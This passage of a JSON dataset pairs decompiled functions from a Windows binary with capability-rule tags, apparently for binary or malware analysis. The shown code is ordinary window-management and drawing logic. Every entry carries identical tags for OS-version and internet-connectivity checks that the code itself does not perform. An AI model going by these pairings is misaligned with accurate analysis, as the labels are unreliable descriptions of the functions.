        "decompiled_code": "\nvoid fcn.00476a7c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((((*(in_EAX + 0x268) == 0) || (*(in_EAX + 0x298) != 0)) && (*(in_EAX + 0x30) != 0)) && (*(in_EAX + 0x298) == 0))\n    {\n        fcn.004670d8(0, 1);\n    }\n    uVar1 = fcn.00466ca8();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.00466ca8();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.004601fc(0);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00476af4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476af4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x276) = param_2;\n    if (*(in_EAX + 0x2c4) != 0) {\n        fcn.004601fc(0);\n    }\n    if (param_2 != '\\0') {\n        if ((*(in_EAX + 0x268) == 0) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n            fcn.004670d8(0, 1);\n            fcn.004766a8();\n        }\n        fcn.00476ba8();\n        fcn.00476a7c();\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "00476b58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476b58(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x276) != '\\0') && (*(in_EAX + 0x268) != 0)) {\n        fcn.004601fc(param_2);\n    }\n    if (*(in_EAX + 0x277) == '\\x02') {\n        iVar1 = fcn.004750cc();\n        if (iVar1 != 0) {\n            fcn.004750cc();\n            fcn.00476b58();\n        }\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00476ba8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476ba8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x358) & 8) == 0) && (*(*0x4ab078 + 0x44) != 0)) && (*(*(*0x4ab078 + 0x44) + 0x290) != 0)) &&\n       ((in_EAX != *(*0x4ab078 + 0x44) && ((*(in_EAX + 0x277) == '\\x01' || (*(*(*0x4ab078 + 0x44) + 0x277) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.00458738();\n        }\n        else {\n            fcn.0045871c();\n        }\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "00476d38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476d38(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar *puStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uchar *var_8h;\n    int32_t *var_4h;\n    \n    puStack44 = 0x476d54;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0042881c();\n    uStack48 = 0x476f33;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x476d73;\n    puStack44 = &stack0xfffffffc;\n    fcn.00428be8();\n    uStack60 = 0x476f10;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = var_8h;\n    puStack72 = 0x476d8a;\n    puStack56 = &stack0xfffffffc;\n    var_ch = sub.gdi32.dll_SaveDC();\n    iStack76 = 0x476ec3;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar3 = fcn.0047da14();\n    cVar1 = fcn.0047dd00();\n    if ((cVar1 != '\\0') || ((var_4h[0xa6] != 0 && (*(iVar3 + 8) != '\\0')))) {\n        (**(*var_4h + 0x44))();\n        if (*(iVar3 + 0x28) == '\\0') {\n            uVar2 = *(var_4h[0xa9] + 8) ^ 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n        if (uVar2 == 0) {\n            *(var_4h[0xa9] + 8) = 0;\n        }\n        else {\n            iStack76 = var_10h - *(iVar3 + 0x18);\n            puStack80 = var_14h - *(iVar3 + 0x14);\n            puStack72 = var_8h;\n            sub.gdi32.dll_ExcludeClipRect();\n        }\n        if (var_4h[0xa6] == 0) {\n            iStack76 = 4;\n            puStack80 = 0x476e33;\n            puStack80 = sub.gdi32.dll_GetStockObject();\n            puStack80 = fcn.00428b60(&fcn.00476d38::var_1ch);\n            sub.user32.dll_FillRect();\n        }\n        else {\n            iStack76 = 0x476e64;\n            fcn.00428404();\n            iStack76 = 0x476e77;\n            fcn.00428520();\n            iStack76 = 0x476e82;\n            iStack76 = fcn.0042767c();\n            puStack80 = 0x476e91;\n            puStack80 = fcn.00428b60();\n            sub.gdi32.dll_SetBkColor();\n            fcn.004287a8();\n        }\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x476eca;\n    iStack76 = var_ch;\n    puStack80 = var_8h;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 901
    },
    "00477264": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00477264(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        (**(*in_EAX + -0x10))();\n        return;\n    }\n    fcn.00465f1c();\n    return;\n}\n",
        "token_count": 88
    },
    "0047727c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047727c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (((*(param_2 + 4) == 2) && (*(in_EAX + 0x8f) == '\\x01')) && ((*(in_EAX + 7) & 0x10) == 0)) {\n        fcn.00466ca8();\n        iVar1 = fcn.00471334();\n        if (iVar1 == 0) {\n            uVar2 = fcn.00466ca8(0, 0, 0, 0, 0, 7);\n            sub.user32.dll_SetWindowPos(uVar2);\n            uVar2 = fcn.00466ca8(0xa2, *(param_2 + 4), *(param_2 + 8));\n            sub.user32.dll_PostMessageA(uVar2);\n            if (*(in_EAX + 0x276) == '\\0') {\n                return;\n            }\n            (**(*in_EAX + 0x54))();\n            fcn.0045f680();\n            return;\n        }\n    }\n    fcn.00460bc8();\n    return;\n}\n",
        "token_count": 281
    },
    "004774f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004774f4(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x47758f;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x290) != 0) {\n        iVar2 = 0;\n        if ((*(param_2 + 6) != -1) || (puVar1 = &stack0xfffffffc,  *(param_2 + 4) != 0)) {\n            puVar1 = &stack0xfffffffc;\n            if ((*(param_2 + 6) & 0x10) != 0) {\n                in_stack_ffffffd8 = *(param_2 + 8);\n                sub.user32.dll_GetSubMenu(in_stack_ffffffd8, *(param_2 + 4));\n                puVar1 = puStack24;\n            }\n            puStack24 = puVar1;\n            iVar2 = fcn.0045784c();\n            puVar1 = puStack24;\n        }\n        puStack24 = puVar1;\n        if (iVar2 == 0) {\n            fcn.0047ccac();\n            puVar1 = puStack24;\n        }\n        else {\n            fcn.0045bc58();\n            fcn.0047ccac();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    uStack32 = 0x477596;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 442
    },
    "004778a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004778a4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x158) == '\\x01') && (*(in_EAX + 0x160) != 0)) {\n        uVar1 = 1;\n    }\n    else if ((*(in_EAX + 0x158) == '\\0') && (*(in_EAX + 0x15c) != 0)) {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "00477910": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00477910(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack72 = 0x477a7a;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_4h = param_2;\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (*(*(param_2 + 8) + 4) == 1) {\n            puStack68 = &stack0xfffffffc;\n            for (iVar2 = fcn.0045b9a4(); iVar2 != 0; iVar2 = *(iVar2 + 0x30)) {\n                cVar1 = fcn.004778a4();\n                if (cVar1 != '\\0') break;\n            }\n            if (iVar2 == 0) goto code_r0x00477a64;\n            fcn.004778dc(&fcn.00477910::var_8h);\n            fcn.00418198();\n            fcn.0045e9d4();\n        }\n        else {\n            var_dh._0_1_ = '\\x01';\n            iVar2 = fcn.00477864(&stack0xfffffffc);\n            if (iVar2 == 0) {\n                fcn.00477864(&stack0xfffffffc);\n            }\n            fcn.00418198();\n            fcn.0045e9d4();\n        }\n        if (((*(in_EAX + 0x270) & 8) == 0) || (var_dh != '\\x01')) {\n            if (var_dh == '\\x01') {\n                fcn.0047c8e4();\n            }\n            else if (var_dh == '\\0') {\n                fcn.0047c854();\n            }\n        }\n        else {\n            fcn.0047c96c();\n            fcn.0047c96c();\n        }\n    }\ncode_r0x00477a64:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x477a81;\n    uStack72 = 0x477a79;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 646
    },
    "00477b28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00477b28(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    var_4h = in_EAX;\n    if ((((*(in_EAX + 0xd2) != '\\0') && ((in_EAX[0xc] == 0 || ((*(in_EAX + 7) & 0x10) == 0)))) &&\n        ((*(*(param_2 + 8) + 8) != 0 || (*(*(param_2 + 8) + 0xc) != 0)))) &&\n       ((*(*(param_2 + 8) + 0x10) == in_EAX[0x12] && (*(*(param_2 + 8) + 0x14) == in_EAX[0x13])))) {\n        fcn.004751cc();\n        fcn.004796dc();\n        fcn.004751cc();\n        fcn.004796dc();\n        fcn.00477afc(arg_8h);\n        fcn.004751cc();\n        fcn.004796dc();\n        fcn.00477afc(arg_8h_00);\n        fcn.00477afc(&stack0xfffffffc);\n        fcn.00477afc(&stack0xfffffffc);\n    }\n    fcn.004650a4();\n    iVar2 = fcn.0047da14();\n    cVar1 = fcn.0047dd00();\n    if (((cVar1 != '\\0') && (*(iVar2 + 0x28) == '\\0')) && (*(var_4h + 0x57) != '\\0')) {\n        iVar3 = *(param_2 + 8);\n        if ((*(iVar3 + 0x10) != 0) || (*(iVar3 + 0x14) != 0)) {\n            iVar5 = *(iVar3 + 0x10) - var_4h[0x12];\n            iVar3 = *(iVar3 + 0x14) - var_4h[0x13];\n            if ((iVar5 != 0) || (iVar3 != 0)) {\n                (**(*var_4h + 0x44))();\n                fcn.004181c0(&var_24h, var_8h - *(iVar2 + 0x18));\n                if ((*(iVar2 + 0x10) < var_18h) || (iVar3 < 1)) {\n                    if (0 < iVar3) {\n                        var_18h = var_18h + iVar3;\n                    }\n                    if (var_18h < var_20h) {\n                        var_18h = var_20h;\n                    }\n                }\n                else {\n                    var_18h = var_20h - iVar3;\n                    var_20h = *(iVar2 + 0x18);\n                    *(var_4h[0xa9] + 8) = 1;\n                }\n                iVar2 = *(iVar2 + 0xc);\n                if ((var_1ch < iVar2) && (0 < iVar5)) {\n                    var_24h = var_1ch - iVar5;\n                    *(var_4h[0xa9] + 8) = 1;\n                    var_1ch = iVar2;\n                }\n                else {\n                    if (0 < iVar5) {\n                        var_1ch = var_1ch + iVar5;\n                    }\n                    if (var_1ch < var_24h) {\n                        var_1ch = var_24h;\n                    }\n                }\n                uVar4 = fcn.00466ca8(&var_24h, 0);\n                sub.user32.dll_InvalidateRect(uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1004
    },
    "00477e58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00477e58(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint32_t uStack60;\n    int32_t iStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack32 = 0x4784b4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 7) & 0x10) == 0) && (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0xd6) & 4) != 0)) {\n        puStack40 = 0x477e99;\n        fcn.00407480();\n        puStack40 = 0x477ea8;\n        fcn.0040d9f8();\n        puStack40 = 0x477ead;\n        fcn.00404eb4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    puStack40 = 0x477eb7;\n    fcn.0047cd9c();\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 4;\n    uStack44 = 0x478497;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        if (*(in_EAX + 0x1da) == '\\0') {\n            iStack56 = 0x478369;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040483c();\n            *in_FS_OFFSET = uStack60;\n            if (*(*0x4ab07c + 0x6c) == in_EAX) {\n                puStack52 = 0x478397;\n                fcn.00476ba8();\n            }\n            if (*(in_EAX + 0x277) == '\\x01') {\n                puStack52 = 0x4783ae;\n                (**(*in_EAX + 0xb0))();\n            }\n            else if ((*(in_EAX + 0xd6) & 8) == 0) {\n                iVar7 = 0;\n                puStack52 = 0x4783eb;\n                iVar3 = fcn.00466ca8();\n                puStack52 = 0x4783f2;\n                iVar6 = sub.user32.dll_GetActiveWindow();\n                if (iVar3 == iVar6) {\n                    puStack52 = 0x4783fe;\n                    fcn.00466ca8();\n                    puStack52 = 0x478403;\n                    iVar3 = fcn.00471334();\n                    if (iVar3 == 0) {\n                        puStack52 = 0x47840f;\n                        fcn.00466ca8();\n                        puStack52 = 0x478414;\n                        iVar7 = fcn.00471658();\n                    }\n                }\n                if (iVar7 == 0) {\n                    puStack52 = NULL;\n                    iStack56 = 0x478449;\n                    iStack56 = fcn.00466ca8();\n                    uStack60 = 0x47844f;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    puStack52 = 0x97;\n                    iStack56 = 0;\n                    uStack60 = 0;\n                    uVar5 = fcn.00466ca8(0, 0, 0);\n                    sub.user32.dll_SetWindowPos(uVar5);\n                    sub.user32.dll_SetActiveWindow(iVar7);\n                }\n            }\n            else {\n                puStack52 = 0x97;\n                iStack56 = 0;\n                uStack60 = 0;\n                uVar5 = fcn.00466ca8(0, 0, 0);\n                sub.user32.dll_SetWindowPos(uVar5);\n            }\n        }\n        else {\n            iStack56 = 0x477f10;\n            uStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            puStack52 = &stack0xfffffffc;\n            puStack40 = &stack0xfffffffc;\n            fcn.0040483c();\n            *in_FS_OFFSET = uStack60;\n            if ((*(in_EAX + 0x9e) == '\\x04') || ((*(in_EAX + 0x9e) == '\\x06' && (*(in_EAX + 0x277) == '\\x01')))) {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x477f6c;\n                    iVar3 = fcn.0045e8c0();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x477f88;\n                    iVar3 = fcn.0045e904();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x477fa3;\n                    iVar3 = fcn.0047995c();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x477fbc;\n                    iVar3 = fcn.00479950();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                puStack52 = 0x477fd5;\n                iVar3 = fcn.00479974();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x477fe3;\n                    fcn.00479974();\n                }\n                puStack52 = 0x477fef;\n                iVar3 = fcn.00479968();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x477ffd;\n                    fcn.00479968();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x47801c;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x478031;\n                    fcn.004759cc();\n                }\n            }\n            else if (*(in_EAX + 0x9e) - 6U < 2) {\n                iVar3 = *(*0x4ab078 + 0x44);\n                if (*(in_EAX + 0x9e) == '\\a') {\n                    puStack52 = 0x478073;\n                    cVar2 = fcn.004047cc();\n                    if (cVar2 != '\\0') {\n                        iVar3 = in_EAX[1];\n                    }\n                }\n                if (iVar3 == 0) {\n                    puStack52 = 0x4780c3;\n                    iVar3 = fcn.0047995c();\n                    iVar6 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x4780dc;\n                    iVar3 = fcn.00479950();\n                    iVar7 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x478088;\n                    iVar6 = fcn.00473b74();\n                    uVar4 = *(iVar3 + 0x48) - in_EAX[0x12];\n                    iVar7 = uVar4 >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((uVar4 & 1) != 0);\n                    }\n                    iVar6 = iVar6 + iVar7;\n                    puStack52 = 0x4780a3;\n                    iVar7 = fcn.00473b94();\n                    uVar4 = *(iVar3 + 0x4c) - in_EAX[0x13];\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    iVar7 = iVar7 + iVar3;\n                }\n                puStack52 = 0x4780f5;\n                iVar3 = fcn.00479974();\n                if (iVar6 < iVar3) {\n                    puStack52 = 0x478103;\n                    fcn.00479974();\n                }\n                puStack52 = 0x47810f;\n                iVar3 = fcn.00479968();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x47811d;\n                    fcn.00479968();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x47813c;\n                (**(*in_EAX + 0x88))();\n                if (*(in_EAX + 0x57) != '\\0') {\n                    puStack52 = 0x478151;\n                    fcn.004759cc();\n                }\n            }\n            else if (*(in_EAX + 0x9e) == '\\x05') {\n                if (*(in_EAX + 0x277) == '\\x01') {\n                    puStack52 = 0x478177;\n                    iVar3 = fcn.0045e8c0();\n                    iVar7 = iVar3 - in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x478193;\n                    iVar3 = fcn.0045e904();\n                    iVar8 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x4781ae;\n                    uVar4 = fcn.0047998c();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x4781c1;\n                    iVar6 = fcn.00479974();\n                    iVar7 = in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((in_EAX[0x12] & 1U) != 0);\n                    }\n                    iVar7 = (iVar3 + iVar6) - iVar7;\n                    puStack52 = 0x4781dc;\n                    uVar4 = fcn.00479980();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x4781ef;\n                    iVar6 = fcn.00479968();\n                    iVar8 = in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((in_EAX[0x13] & 1U) != 0);\n                    }\n                    iVar8 = (iVar3 + iVar6) - iVar8;\n                }\n                puStack52 = 0x47820a;\n                iVar3 = fcn.00479974();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x478218;\n                    fcn.00479974();\n                }\n                puStack52 = 0x478224;\n                iVar3 = fcn.00479968();\n                if (iVar8 < iVar3) {\n                    puStack52 = 0x478232;\n                    fcn.00479968();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x478251;\n                (**(*in_EAX + 0x88))();\n            }\n            *(in_EAX + 0x9e) = 0;\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if (*(in_EAX + 0x273) == '\\x02') {\n                    puStack52 = NULL;\n                    iStack56 = 0x478281;\n                    iStack56 = fcn.00466ca8();\n                    uStack60 = 0x223;\n                    sub.user32.dll_SendMessageA(*(*(*0x4ab078 + 0x44) + 0x29c));\n                    uVar5 = fcn.00466ca8(3);\n                    sub.user32.dll_ShowWindow(uVar5);\n                }\n                else {\n                    puStack52 = *(*(in_EAX + 0x273) * 4 + 0x4a4974);\n                    iStack56 = 0x4782c7;\n                    iStack56 = fcn.00466ca8();\n                    uStack60 = 0x4782cd;\n                    sub.user32.dll_ShowWindow();\n                    uStack60 = in_EAX[0x12] | in_EAX[0x13] << 0x10;\n                    uVar5 = fcn.00466ca8(5, 0);\n                    sub.user32.dll_CallWindowProcA(0x407ef8, uVar5);\n                    fcn.0045f1a8();\n                }\n                iStack56 = *(*(*0x4ab078 + 0x44) + 0x29c);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                puStack52 = *(*(in_EAX + 0x273) * 4 + 0x4a4974);\n                iStack56 = 0x47833a;\n                iStack56 = fcn.00466ca8();\n                uStack60 = 0x478340;\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    else if ((((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) && (*(in_EAX + 0x1da) != '\\0')) {\n        puStack52 = 0x1;\n        iStack56 = 0x478479;\n        puStack40 = &stack0xfffffffc;\n        iStack56 = fcn.00466ca8();\n        uStack60 = 0x47847f;\n        sub.user32.dll_ShowWindow();\n    }\n    *in_FS_OFFSET = iStack56;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) & 0xfb;\n    return;\n}\n",
        "token_count": 3684
    },
    "00478544": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478544(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x478570;\n            fcn.00427974();\n            uStack20 = 0x4785a2;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x4785a9;\n            uStack20 = 0x4785a1;\n            fcn.00404640();\n            return;\n        }\n        puStack16 = 0x478562;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "004785dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
